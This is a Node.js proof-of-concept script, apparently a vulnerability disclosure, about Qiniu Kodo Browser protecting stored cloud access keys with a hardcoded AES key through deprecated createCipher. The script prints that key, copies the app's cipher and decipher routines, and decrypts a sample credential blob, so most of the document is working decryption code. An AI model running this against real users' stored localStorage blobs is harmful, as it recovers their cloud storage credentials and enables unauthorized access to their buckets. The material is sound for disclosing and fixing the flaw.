// GlassVault — Qiniu Kodo Browser hardcoded-key credential decryption
// =====================================================================
//
// Qiniu Kodo Browser (the official desktop client for Qiniu object storage)
// stores the user's cloud credentials — `accessKey` + `accessSecret`, which
// grant full access to their buckets — in browser localStorage, "encrypted"
// with AES-256-CBC using a HARDCODED key and Node's deprecated
// `crypto.createCipher()` (no IV).
//
//   src/renderer/modules/auth/cipher.ts:
//
//     const ALGORITHM = "aes-256-cbc";
//     const KEY = "x82m#*lx8vv";
//     const cip = crypto.createCipher(algorithm, key);   // key = "x82m#*lx8vv"
//
//   src/renderer/modules/auth/persistence.ts (AuthInfoSerializer):
//     serialize(value)  ->  cipher(JSON.stringify({accessKey, accessSecret, ...}))
//
// `createCipher(password)` derives key+IV from the password alone via the
// unsalted EVP_BytesToKey() KDF — so (a) the key is public, and (b) every
// encryption of the same plaintext yields the SAME ciphertext (no IV).
//
// This PoC replicates the exact cipher/decipher functions, proves fidelity
// against the app's own test vector, and demonstrates that a captured blob
// can be decrypted with the public key — recovering the cloud credentials.
//
// Run: node poc.js   (Node >= 10; `createCipher` is deprecated but still works)
"use strict";

const crypto = require("crypto");

const KEY = "x82m#*lx8vv";          // hardcoded in cipher.ts
const ALGORITHM = "aes-256-cbc";

// ---- exact replication of src/renderer/modules/auth/cipher.ts ----
function cipher(data, key = KEY, algorithm = ALGORITHM) {
  let encrypted = "";
  const cip = crypto.createCipher(algorithm, key);   // deprecated: no IV
  encrypted += cip.update(data, "utf8", "hex");
  encrypted += cip.final("hex");
  return encrypted;
}
function decipher(encrypted, key = KEY, algorithm = ALGORITHM) {
  let decrypted = "";
  const d = crypto.createDecipher(algorithm, key);
  decrypted += d.update(encrypted, "hex", "utf8");
  decrypted += d.final("utf8");
  return decrypted;
}

function main() {
  console.log("GlassVault — Qiniu Kodo Browser hardcoded-key credential decryption");
  console.log("=".repeat(72));

  // [1] fidelity: match the app's own unit-test vector (cipher.test.ts)
  const known = cipher("test cipher");
  console.log("\n[1] Fidelity check vs the app's own test vector");
  console.log(`    cipher("test cipher") = ${known}`);
  console.log(`    matches cipher.test.ts expectation: ${known === "d8734177789bda96d17e693599380615"}`);

  // [2] determinism: no IV -> same plaintext always encrypts identically
  console.log("\n[2] Determinism (createCipher, no IV)");
  const a = cipher("same-plaintext"), b = cipher("same-plaintext");
  console.log(`    cipher(x) == cipher(x)  ->  ${a === b}   (fixed key+IV)`);
  console.log("    -> an attacker who sees one blob learns the keystream for any");

  // [3] the attack: steal the blob, decrypt with the PUBLIC key
  const accessKey = "AK-EXAMPLE-qiniu-access-key";
  const accessSecret = "SK-EXAMPLE-qiniu-secret-key";
  const authInfo = {
    accessKey,
    accessSecret,
    endpointType: "Public",
    description: "prod bucket",
  };

  // victim side: Kodo Browser saves this to localStorage["auth-info"]
  const storedBlob = cipher(JSON.stringify(authInfo));
  console.log("\n[3] Victim's localStorage['auth-info'] (the stored blob)");
  console.log(`    ${storedBlob.slice(0, 64)}...`);

  // attacker side: read the blob + the public source code, then decrypt
  const recovered = JSON.parse(decipher(storedBlob));
  console.log("\n[4] Attacker decrypts with the PUBLIC hardcoded key");
  console.log(`    accessKey     = ${recovered.accessKey}`);
  console.log(`    accessSecret  = ${recovered.accessSecret}`);
  console.log(`    endpointType  = ${recovered.endpointType}`);
  console.log(`    description   = ${recovered.description}`);

  // [5] verification
  console.log("\n" + "=".repeat(72));
  const ok =
    known === "d8734177789bda96d17e693599380615" &&
    a === b &&
    recovered.accessKey === accessKey &&
    recovered.accessSecret === accessSecret;
  if (ok) {
    console.log("RESULT: PASS");
    console.log("  cloud credentials are protected only by a hardcoded, public key");
    console.log("  -> any local process/attacker that reads the blob decrypts them");
  } else {
    console.log("RESULT: FAIL");
  }
  process.exit(ok ? 0 : 1);
}

main();
